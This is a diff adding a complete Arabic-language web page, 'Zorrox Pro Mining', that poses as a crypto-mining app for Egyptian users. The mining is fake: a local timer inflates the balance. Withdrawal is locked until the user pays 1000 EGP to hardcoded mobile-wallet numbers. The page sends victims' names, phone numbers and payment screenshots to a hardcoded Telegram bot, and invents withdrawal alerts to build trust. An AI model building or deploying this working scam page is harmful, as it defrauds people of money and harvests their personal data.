@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zorrox Pro Mining</title>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <style>
+        :root {
+            --bg-color: #0a0e17;
+            --card-bg: #141b2d;
+            --text-color: #ffffff;
+            --accent-color: #ff1744;
+            --success-color: #00e676;
+            --border-radius: 12px;
+            --nav-bg: #1a2542;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            margin: 0;
+            padding-bottom: 80px;
+            display: flex;
+            justify-content: center;
+        }
+
+        .dashboard { width: 100%; max-width: 900px; padding: 20px; }
+
+        h1 { text-align: center; margin-bottom: 30px; font-weight: 300; }
+        h1 span { color: var(--accent-color); font-weight: bold; }
+
+        .content-section { display: none; }
+        .content-section.active { display: block; }
+
+        .card {
+            background: var(--card-bg);
+            padding: 25px;
+            border-radius: var(--border-radius);
+            border: 1px solid #2a354f;
+            margin-bottom: 20px;
+        }
+
+        .card-header {
+            display: flex;
+            align-items: center;
+            font-size: 1.2rem;
+            margin-bottom: 20px;
+            color: #b0bec5;
+        }
+
+        .balance-amount {
+            font-size: 2.5rem;
+            font-weight: bold;
+            color: var(--accent-color);
+            text-align: center;
+        }
+
+        .mining-container { text-align: center; }
+
+        .mining-circle {
+            width: 150px; height: 150px;
+            border-radius: 50%;
+            background: radial-gradient(circle, #1a2542 0%, #0a0e17 100%);
+            border: 5px solid #2a354f;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            cursor: pointer;
+            position: relative;
+            transition: background 0.3s, border-color 0.3s;
+            margin: 0 auto 15px auto;
+        }
+
+        .mining-circle.active {
+            cursor: not-allowed;
+        }
+
+        #timer { color: var(--accent-color); font-weight: bold; }
+
+        .progress-bar {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            height: 10px;
+            background-color: var(--accent-color);
+            width: 0%;
+            border-radius: 0 0 5px 5px;
+        }
+
+        .live-notifications {
+            margin-top: 20px;
+            font-size: 0.9rem;
+            background: #1a2542;
+            padding: 10px;
+            border-radius: 8px;
+            max-height: 100px;
+            overflow: hidden;
+            text-align: right;
+        }
+
+        .notification-item {
+            border-bottom: 1px solid #2a354f;
+            padding: 5px 0;
+        }
+
+        input, select, button, textarea {
+            width: 100%;
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            border: 1px solid #2a354f;
+            background: #0a0e17;
+            color: white;
+            box-sizing: border-box;
+        }
+
+        button {
+            background: linear-gradient(45deg, #d32f2f, #ff1744);
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            border: none;
+        }
+        
+        button:disabled {
+            background: #555;
+            cursor: not-allowed;
+        }
+
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background-color: var(--nav-bg);
+            display: flex;
+            justify-content: space-around;
+            padding: 10px 0;
+            box-shadow: 0 -2px 10px rgba(0,0,0,0.3);
+        }
+
+        .nav-item {
+            flex: 1;
+            text-align: center;
+            padding: 10px;
+            cursor: pointer;
+            color: #b0bec5;
+        }
+
+        .nav-item.active { color: var(--accent-color); font-weight: bold; }
+
+        .deposit-needed {
+            background-color: rgba(255, 23, 68, 0.1);
+            border: 2px solid var(--accent-color);
+            color: white;
+            padding: 20px;
+            border-radius: var(--border-radius);
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .wallet-number {
+            background: #1a2542;
+            padding: 15px;
+            border-radius: 8px;
+            border: 1px solid var(--accent-color);
+            font-weight: bold;
+            color: white;
+            margin: 10px 0;
+            font-size: 1.2rem;
+            letter-spacing: 2px;
+            display: block;
+            text-align: center;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="dashboard">
+    <h1>Zorrox <span>Pro</span></h1>
+
+    <div id="section-home" class="content-section active">
+        <div class="card">
+            <div class="card-header">💰 رصيد المحفظة</div>
+            <div class="balance-amount"><span id="balance">0</span> EGP</div>
+        </div>
+
+        <div class="card">
+            <div class="card-header">⚡ وحدة التعدين</div>
+            <div class="mining-container">
+                <div id="miningCircle" class="mining-circle" onclick="startMining()">
+                    <div id="miningText">ابدأ التعدين</div>
+                    <div id="timer"></div>
+                    <div id="progressBar" class="progress-bar"></div>
+                </div>
+                <p>24 ساعة = 1000 EGP</p>
+
+                <div class="live-notifications" id="notifications">
+                    <div class="notification-item">جاري تحميل المعاملات...</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="section-withdraw" class="content-section">
+        <div class="card">
+            <div class="card-header">💸 سحب الأرباح</div>
+            
+            <div id="withdrawContent">
+                <div class="deposit-needed">
+                    <h3 style="color: var(--accent-color); margin-top: 0;">⚠️ تفعيل الحساب</h3>
+                    <p>يجب إيداع <strong style="color:white; font-size:1.2rem;">1000 جنية</strong> لتفعيل خاصية السحب.</p>
+                    <button onclick="showSection('deposit', document.querySelectorAll('.nav-item')[2])">اذهب للإيداع</button>
+                </div>
+            </div>
+            
+            <div id="withdrawForm" style="display:none;">
+                <input type="text" id="withdrawName" placeholder="الاسم الثلاثي">
+                <input type="tel" id="withdrawPhone" placeholder="رقم استلام الأرباح" maxlength="11">
+                <button onclick="requestWithdraw()">طلب سحب (3000 حد أدنى)</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="section-deposit" class="content-section">
+        <div class="card">
+            <div class="card-header">🏦 إيداع</div>
+            
+            <div id="depositStep1">
+                <input type="number" id="depositAmount" placeholder="أدخل المبلغ المراد إيداعه">
+                <button onclick="goToDepositStep2()">التالي</button>
+            </div>
+            
+            <div id="depositStep2" style="display:none;">
+                <p>قم بتحويل المبلغ إلى الرقم التالي:</p>
+                <div class="wallet-number" id="randomWallet">...</div>
+                
+                <hr style="border: 1px solid #2a354f; margin: 20px 0;">
+                
+                <p>أدخل الرقم الذي قمت بالتحويل منه:</p>
+                <input type="tel" id="senderPhone" placeholder="01XXXXXXXXX" maxlength="11">
+                
+                <p>قم برفع صورة (سكرين شوت) تؤكد عملية التحويل:</p>
+                <input type="file" id="depositScreenshot" accept="image/*">
+                
+                <button onclick="sendDepositToBot()">تأكيد الإيداع</button>
+                <button onclick="backToStep1()" style="background: #555;">رجوع</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="bottom-nav">
+    <div class="nav-item active" onclick="showSection('home',this)">🏠 الرئيسية</div>
+    <div class="nav-item" onclick="showSection('withdraw',this)">💸 سحب</div>
+    <div class="nav-item" onclick="showSection('deposit',this)">🏦 إيداع</div>
+</div>
+
+<script>
+/* ===== إعدادات البوت ===== */
+const BOT_TOKEN = "8349631082:AAEkhEPtJoxG2xszGCTs05WNMl3VRzcOTZ4";
+const CHAT_ID = "5913937588";
+
+/* ===== المتغيرات الأساسية ===== */
+let balance = parseFloat(localStorage.getItem('balance')) || 0;
+let isMining = localStorage.getItem('isMining') === 'true';
+let miningEndTime = parseInt(localStorage.getItem('miningEndTime')) || 0;
+let earned = parseFloat(localStorage.getItem('earned')) || 0;
+let hasDeposited = localStorage.getItem('hasDeposited') === 'true';
+
+const TOTAL_TIME = 24 * 60 * 60 * 1000;
+const TOTAL_REWARD = 1000;
+const MIN_WITHDRAW = 3000;
+
+// الأرقام المتاحة
+const wallets = ["01221691641", "01281663199"];
+
+/* ===== عناصر الواجهة ===== */
+const balanceDisplay = document.getElementById('balance');
+const miningText = document.getElementById('miningText');
+const timerDisplay = document.getElementById('timer');
+const miningCircle = document.getElementById('miningCircle');
+const progressBar = document.getElementById('progressBar');
+const notificationsContainer = document.getElementById('notifications');
+
+const depositStep1 = document.getElementById('depositStep1');
+const depositStep2 = document.getElementById('depositStep2');
+const randomWalletDisplay = document.getElementById('randomWallet');
+
+/* ===== تهيئة الصفحة ===== */
+function updateUI() {
+    balanceDisplay.innerText = balance.toFixed(2);
+    localStorage.setItem('balance', balance);
+    checkDepositStatus();
+}
+
+function checkDepositStatus() {
+    if (hasDeposited) {
+        document.getElementById('withdrawContent').style.display = 'none';
+        document.getElementById('withdrawForm').style.display = 'block';
+    } else {
+        document.getElementById('withdrawContent').style.display = 'block';
+        document.getElementById('withdrawForm').style.display = 'none';
+    }
+}
+updateUI();
+
+/* ===== التعدين ===== */
+function startMining() {
+    if (isMining) return;
+    isMining = true;
+    earned = 0;
+    miningEndTime = Date.now() + TOTAL_TIME;
+    localStorage.setItem('isMining', 'true');
+    localStorage.setItem('miningEndTime', miningEndTime);
+    localStorage.setItem('earned', 0);
+    checkMiningStatus();
+}
+
+function checkMiningStatus() {
+    if (!isMining) return;
+    let now = Date.now();
+    let remaining = miningEndTime - now;
+    let elapsed = TOTAL_TIME - remaining;
+    if (elapsed < 0) elapsed = TOTAL_TIME;
+    let newEarned = (elapsed / TOTAL_TIME) * TOTAL_REWARD;
+    let diff = newEarned - earned;
+    if (diff > 0) {
+        balance += diff;
+        earned = newEarned;
+        localStorage.setItem('earned', earned);
+        updateUI();
+    }
+    if (remaining <= 0) {
+        isMining = false;
+        localStorage.setItem('isMining', 'false');
+        miningText.innerText = "ابدأ التعدين";
+        timerDisplay.innerText = "";
+        progressBar.style.width = "100%";
+        miningCircle.classList.remove('active');
+        return;
+    }
+    let h = Math.floor(remaining / 3600000);
+    let m = Math.floor((remaining % 3600000) / 60000);
+    let s = Math.floor((remaining % 60000) / 1000);
+    timerDisplay.innerText = `${h}س : ${m}د : ${s}ث`;
+    progressBar.style.width = (elapsed / TOTAL_TIME * 100) + "%";
+    miningText.innerText = "جاري التعدين";
+    miningCircle.classList.add('active');
+    setTimeout(checkMiningStatus, 1000);
+}
+
+/* ===== السحب المحدث ===== */
+function requestWithdraw() {
+    const name = document.getElementById('withdrawName').value;
+    const phone = document.getElementById('withdrawPhone').value;
+    
+    if (balance < MIN_WITHDRAW) {
+        alert("⚠️ الرصيد أقل من الحد الأدنى (3000 EGP)");
+        return;
+    }
+    if (name.length < 5 || phone.length < 11) {
+        alert("⚠️ يرجى إدخال البيانات بشكل صحيح");
+        return;
+    }
+    if (!hasDeposited) {
+        alert("⚠️ خطأ: يجب الإيداع أولاً لتفعيل السحب");
+        return;
+    }
+
+    // إرسال طلب السحب للبوت
+    let message = `💸 *طلب سحب جديد*\n\n` +
+                  `الاسم: ${name}\n` +
+                  `الرقم: ${phone}\n` +
+                  `المبلغ: ${balance} EGP`;
+    
+    axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: "Markdown"
+    });
+
+    alert("✅ تم إرسال طلب السحب للمراجعة.");
+    balance = 0; // تصفير الرصيد مؤقتاً حتى الموافقة
+    updateUI();
+}
+
+/* ===== الإيداع المحدث (ارسال للبوت) ===== */
+function goToDepositStep2() {
+    let amt = parseFloat(document.getElementById('depositAmount').value);
+    if (isNaN(amt) || amt <= 0) {
+        alert("⚠️ يرجى إدخال مبلغ صحيح");
+        return;
+    }
+    
+    let randomWallet = wallets[Math.floor(Math.random() * wallets.length)];
+    randomWalletDisplay.innerText = randomWallet;
+    
+    depositStep1.style.display = 'none';
+    depositStep2.style.display = 'block';
+}
+
+function backToStep1() {
+    depositStep2.style.display = 'none';
+    depositStep1.style.display = 'block';
+}
+
+function sendDepositToBot() {
+    let senderPhone = document.getElementById('senderPhone').value;
+    let screenshotInput = document.getElementById('depositScreenshot');
+    let amt = document.getElementById('depositAmount').value;
+
+    if (senderPhone.length < 11 || screenshotInput.files.length === 0) {
+        alert("⚠️ يرجى إدخال رقم الهاتف الذي حولت منه ورفع صورة السكرين شوت");
+        return;
+    }
+    
+    // تحضير البيانات للإرسال
+    let formData = new FormData();
+    formData.append("chat_id", CHAT_ID);
+    formData.append("photo", screenshotInput.files[0]);
+    formData.append("caption", `🏦 *طلب إيداع جديد*\n\nالمبلغ: ${amt} EGP\nالرقم المحول منه: ${senderPhone}`);
+    formData.append("parse_mode", "Markdown");
+
+    // إرسال الصورة والبيانات للبوت
+    axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, formData)
+    .then(response => {
+        alert("✅ تم إرسال طلب الإيداع للمراجعة. سيتم تفعيل الحساب قريباً.");
+        backToStep1();
+    })
+    .catch(error => {
+        alert("❌ حدث خطأ في الإرسال.");
+    });
+}
+
+function showSection(id, el) {
+    document.querySelectorAll('.content-section').forEach(s => s.classList.remove('active'));
+    document.getElementById('section-' + id).classList.add('active');
+    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+    if (el) el.classList.add('active');
+    if (id === 'withdraw') checkDepositStatus();
+}
+
+/* ===== الإشعارات ===== */
+function addFakeNotification() {
+    const prefixes = ["010","011","012","015"];
+    const phone = prefixes[Math.floor(Math.random()*4)] + Math.floor(10000000 + Math.random()*90000000);
+    const amount = (Math.random() * (35000 - 3000) + 3000).toFixed(2);
+    const div = document.createElement('div');
+    div.className = "notification-item";
+    div.innerHTML = `تم سحب <b>${amount} EGP</b> لـ ${phone.slice(0,4)}****${phone.slice(8)}`;
+    notificationsContainer.prepend(div);
+    if (notificationsContainer.children.length > 3)
+        notificationsContainer.removeChild(notificationsContainer.lastChild);
+}
+setInterval(addFakeNotification, 5000);
+
+if (isMining) checkMiningStatus();
+
+/* ===== تأثير RGB ===== */
+let hue = 0;
+function animateMiningCircle() {
+    if (isMining) {
+        miningCircle.style.borderColor = `hsl(${hue}, 100%, 50%)`;
+        miningCircle.style.background = `radial-gradient(circle, hsl(${(hue + 60) % 360}, 100%, 30%) 0%, hsl(${(hue + 180) % 360}, 100%, 10%) 100%)`;
+        hue = (hue + 2) % 360;
+    } else {
+        miningCircle.style.borderColor = "#2a354f";
+        miningCircle.style.background = "radial-gradient(circle, #1a2542 0%, #0a0e17 100%)";
+    }
+    requestAnimationFrame(animateMiningCircle);
+}
+animateMiningCircle();
+</script>
+
+</body>
+</html>
